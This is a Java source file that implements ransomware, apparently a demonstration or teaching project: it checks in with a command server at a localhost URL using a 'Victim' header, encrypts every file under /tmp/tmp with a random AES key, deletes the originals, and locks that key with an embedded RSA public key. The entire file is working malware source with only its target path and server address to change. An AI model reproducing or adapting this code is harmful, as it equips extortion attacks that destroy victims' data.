import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

class secret {
	private String req_url="http://127.0.0.1/recv.php";
	private static byte[] key;
	private static SecretKeySpec secretKey;
	private static String publicKey  = "-----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmPgtRSaWIL5XbY+B0oQVNfdUhPqs8/C1bXIzDGhvP6mw5h+Ma8Yzxt72mnGxb0WSkA1GlV7ku3pWK5gN1SnlzheuAqWdWo9UeJODPEKjE3V5eWv5QLQLNF5bw6xJVg/VTegS0IHzx5V3R53AfpGbRbaW2xdWnEQb1xM7C+dm/b5TwC0Ph295LViDlPeiZOF/ulpRExHYos4liFEohqsPdtI7/opo8KKi9p3ZrULMUqTvEn3MfCoyuWVTnR8QqOaLNV1lyuptQHpJUgxQn43p9EdTnEcXXdSaJ88+Wok9BIJB73bXd9/YHQIGXHC5RVj3nNEysyDBDx4ThuYaMm5BjCoFIPN8E4ce+tDWOp1FpMwct1oupMkwsEbp7zVKMLAECVlKSNICY2kR64U4g1/XtkPD8+/wd/No1buan5eTmUiOsao/7HoQSI3vuMGr2dNQl0daNp/0JNkLWSu8hrABDcIQD6YnkzGFiuTvB3JHv9HiinU9IUPgh+1jUuIUtDg0mlgH/wjkuTVCIPpEmfXdhb6yofhXM/Y5Jk6GNU3G4SX9M5NQ0rcKoMXNu2Je7BXMrL9E78JVViM8KBDJLvPdSVExTWzQP586SazRgI6VlK9MH0Yom0h89yTa5G8XjoFVPiSSXUkog/sl7g4Cs8LCL7VrE0xuiT+3TyCUlQESGFUCAwEAAQ==-----END PUBLIC KEY-----";

	void setKey(String myKey){
		MessageDigest sha = null;
		try{
			key = myKey.getBytes("UTF-8");
			sha = MessageDigest.getInstance("SHA-1");
			key = sha.digest(key);
			key = Arrays.copyOf(key, 16);
			secretKey = new SecretKeySpec(key, "AES");
		}
		catch (NoSuchAlgorithmException e){
			e.printStackTrace();
		}
		catch (UnsupportedEncodingException e){
			e.printStackTrace();
		}
	}
	void encryptFiles(int cipherMode,String inputFile,String outputFile,String secret) throws Exception{
			setKey(secret);
			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE,secretKey);
			byte[] textString;
			textString = Files.readAllBytes(Paths.get(inputFile));
			byte[] cipherText = cipher.doFinal(textString);
			try{
				FileOutputStream fileOutputStream = null;
				fileOutputStream = new FileOutputStream(outputFile);
				fileOutputStream.write(cipherText);
			}
			catch (IOException e){
				throw new IOException(e);
			}
    }
    void initiaiteConnection() throws IOException{
        sendPOST();
    }
	void encryptAESkey(String supersecretKey) throws Exception{
		String pubKey = publicKey.replaceAll("-","").replaceAll("BEGIN PUBLIC KEY","").replaceAll("END PUBLIC KEY","");
		byte[] publickBytes = Base64.getDecoder().decode(pubKey);
		X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publickBytes);
		try{
			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
			PublicKey public_Key = keyFactory.generatePublic(keySpec);
			Cipher cipher = Cipher.getInstance("RSA");
			cipher.init(Cipher.ENCRYPT_MODE,public_Key);
			byte[] cipherText = cipher.doFinal(supersecretKey.getBytes());
			FileOutputStream fileOutputStream = null;
			try{
				fileOutputStream = new FileOutputStream("/tmp/tmp/key.enc");
				fileOutputStream.write(cipherText);
			}
			catch (IOException e){
				e.printStackTrace();
			}
		}
		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
			e.printStackTrace();
		}
	}

    void sendPOST() throws IOException{
        URL obj = new URL(req_url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.addRequestProperty("Victim", "Yes");
		int maxTries = 3;
		while(maxTries != 0){
			int code = con.getResponseCode();
			if(code == 200){
				break;
			}
			maxTries--;
		}
		if(maxTries == 0){
			//code for self destruction
			System.out.println("Not Reachable!");
			System.exit(0);
		}
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
		}
		in.close();
		String identifier = response.toString();
    }
}

class RansomwareActivate{
	private String supersecretKey = "";
	String chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890!@#$_";
	String generateKey(){
		Random r = new Random();
		int i;
		for(i=0;i<50;i++){
			supersecretKey=supersecretKey+chars.charAt(r.nextInt(chars.length()));
		}
		//System.out.println(supersecretKey);
		return supersecretKey;
	}

	String encryptAllFiles() throws IOException{
		supersecretKey = generateKey();
		secret sec = new secret();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Encrypting file: "+file.toString());
				sec.encryptFiles(Cipher.ENCRYPT_MODE, file.toString(),file.toString()+".enc",supersecretKey);
				File f = new File(file.toString());
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
		return supersecretKey;
	}
}

class encrypt {
	private static String key_aes = "";
	static String activate() throws IOException{
		RansomwareActivate ransomware  = new RansomwareActivate();
		key_aes =  ransomware.encryptAllFiles();
		return key_aes;
	}
	public static void main(String[] args) throws IOException{
		secret sec = new secret();
		sec.initiaiteConnection();
		key_aes = activate();
		try{
			sec.encryptAESkey(key_aes);
		}
		catch (Exception e){
			e.printStackTrace();
		}
	}
}